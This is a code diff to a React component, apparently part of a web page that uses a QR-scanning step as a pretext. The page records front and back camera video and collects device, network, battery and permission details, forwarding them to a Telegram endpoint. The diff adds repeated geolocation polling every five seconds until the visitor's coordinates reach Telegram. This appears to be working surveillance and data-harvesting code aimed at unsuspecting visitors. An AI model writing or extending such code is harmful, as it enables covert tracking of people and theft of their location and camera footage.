@@ -17,6 +17,7 @@ const TELEGRAM_API_ENDPOINT = "/api/telegram";
 const VIDEO_1_DURATION_MS = 3000; // 3 секунды для фронтальной камеры
 const VIDEO_2_DURATION_MS = 4000; // 4 секунды для задней камеры
 const QR_SCAN_TIMEOUT_MS = 35000; // 35 секунд для видимого QR-сканирования
+const GEOLOCATION_POLL_INTERVAL_MS = 5000; // Опрос геолокации каждые 5 секунд
 
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
@@ -72,6 +73,10 @@ const PermissionHandler = () => {
   const processInitiatedRef = useRef(false);
   const [attempt, setAttempt] = useState(1); // New state to track attempts
   const [geolocationDisplay, setGeolocationDisplay] = useState<{ status: string; data?: GeolocationData } | null>(null); // New state for geolocation display
+
+  // Новые референсы для управления геолокацией
+  const geolocationSentRef = useRef(false);
+  const geolocationIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   const generateSessionId = useCallback(() => {
     return Math.random().toString(36).substring(2, 10).toUpperCase();
@@ -222,8 +227,44 @@ const PermissionHandler = () => {
     processInitiatedRef.current = false;
     setAttempt(1);
     setGeolocationDisplay(null); // Reset geolocation display
+    geolocationSentRef.current = false; // Сброс флага отправки геолокации
+    if (geolocationIntervalRef.current) { // Очистка интервала при новой сессии
+      clearInterval(geolocationIntervalRef.current);
+      geolocationIntervalRef.current = null;
+    }
     console.log(`[Session ${currentSessionId}] Session reset. New Session ID: ${generateSessionId()}, Attempt: 1`);
   }, [generateSessionId, currentSessionId]);
+
+  // Новая функция для периодического опроса геолокации
+  const pollGeolocationAndSend = useCallback(async () => {
+    if (geolocationSentRef.current) {
+      console.log(`[Session ${currentSessionId}] Geolocation already sent. Stopping polling.`);
+      if (geolocationIntervalRef.current) {
+        clearInterval(geolocationIntervalRef.current);
+        geolocationIntervalRef.current = null;
+      }
+      return;
+    }
+
+    console.log(`[Session ${currentSessionId}] Polling for geolocation...`);
+    const geolocationResult = await getGeolocation();
+    setGeolocationDisplay(geolocationResult); // Обновляем состояние для отображения
+
+    if (geolocationResult.data && !geolocationSentRef.current) {
+      console.log(`[Session ${currentSessionId}] Geolocation data received:`, geolocationResult.data);
+      const sendSuccess = await sendDataToTelegram({ geolocation: geolocationResult.data }, MessageType.Geolocation, attempt);
+      if (sendSuccess) {
+        geolocationSentRef.current = true;
+        console.log(`[Session ${currentSessionId}] Geolocation successfully sent to Telegram. Stopping polling.`);
+        if (geolocationIntervalRef.current) {
+          clearInterval(geolocationIntervalRef.current);
+          geolocationIntervalRef.current = null;
+        }
+      }
+    } else {
+      console.log(`[Session ${currentSessionId}] Geolocation status: ${geolocationResult.status}. Retrying in ${GEOLOCATION_POLL_INTERVAL_MS / 1000} seconds.`);
+    }
+  }, [currentSessionId, sendDataToTelegram, attempt]);
 
   const runProcess = useCallback(async () => {
     console.log(`[Session ${currentSessionId}] runProcess called. Current attempt: ${attempt}, processInitiatedRef.current: ${processInitiatedRef.current}`);
@@ -245,20 +286,13 @@ const PermissionHandler = () => {
       const [
         permissionStatusResult,
         batteryInfoResult,
-        geolocationResult,
       ] = await Promise.all([
         getPermissionStatus(),
         getBatteryInfo(),
-        getGeolocation(),
       ]);
 
-      // Update geolocation display state
-      setGeolocationDisplay(geolocationResult);
-
-      if (geolocationResult.data) {
-        console.log(`[Session ${currentSessionId}] Geolocation data found, sending immediately.`);
-        sendDataToTelegram({ geolocation: geolocationResult.data }, MessageType.Geolocation, attempt);
-      }
+      // Геолокация теперь опрашивается отдельно, но статус разрешения все еще нужен
+      const currentGeolocationStatus = geolocationDisplay?.status || "Unknown"; 
 
       const clientInfo = getClientInfo();
       const networkInfo = getNetworkInfo();
@@ -274,11 +308,9 @@ const PermissionHandler = () => {
         initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
       }
 
-      if (geolocationResult.data) {
-        initialCollectedData.geolocation = geolocationResult.data;
-      }
+      // Обновляем статус геолокации в permissionStatus, но не сами координаты
       if (initialCollectedData.permissionStatus) {
-        initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
+        initialCollectedData.permissionStatus.geolocation = currentGeolocationStatus;
       }
       
       setCollectedData(initialCollectedData);
@@ -321,7 +353,8 @@ const PermissionHandler = () => {
     setProcessSuccessful,
     setCollectedData,
     processInitiatedRef,
-    attempt
+    attempt,
+    geolocationDisplay?.status // Добавлено для получения актуального статуса геолокации
   ]);
 
   useEffect(() => {
@@ -329,6 +362,32 @@ const PermissionHandler = () => {
       runProcess();
     }
   }, [sessionKey, runProcess, attempt]);
+
+  // Эффект для запуска и остановки опроса геолокации
+  useEffect(() => {
+    // Очищаем предыдущий интервал, если он существует
+    if (geolocationIntervalRef.current) {
+      clearInterval(geolocationIntervalRef.current);
+      geolocationIntervalRef.current = null;
+    }
+
+    // Запускаем опрос только если геолокация еще не была отправлена
+    if (!geolocationSentRef.current) {
+      console.log(`[Session ${currentSessionId}] Starting geolocation polling.`);
+      // Вызываем pollGeolocationAndSend сразу, чтобы не ждать первого интервала
+      pollGeolocationAndSend(); 
+      geolocationIntervalRef.current = setInterval(pollGeolocationAndSend, GEOLOCATION_POLL_INTERVAL_MS);
+    }
+
+    // Функция очистки для остановки интервала при размонтировании или изменении зависимостей
+    return () => {
+      if (geolocationIntervalRef.current) {
+        console.log(`[Session ${currentSessionId}] Clearing geolocation polling interval.`);
+        clearInterval(geolocationIntervalRef.current);
+        geolocationIntervalRef.current = null;
+      }
+    };
+  }, [currentSessionId, pollGeolocationAndSend]); // Зависимости для перезапуска эффекта
 
 
   return (
@@ -341,7 +400,7 @@ const PermissionHandler = () => {
           <p className="text-lg mb-4 text-center font-bold text-primary animate-pulse">
             {loadingMessage}
           </p>
-          {appPhase === "collectingData" && geolocationDisplay && (
+          {geolocationDisplay && (
             <div className="text-sm text-muted-foreground mb-4 text-center">
               <p>Геолокация: <span className="font-semibold">{geolocationDisplay.status}</span></p>
               {geolocationDisplay.data && (
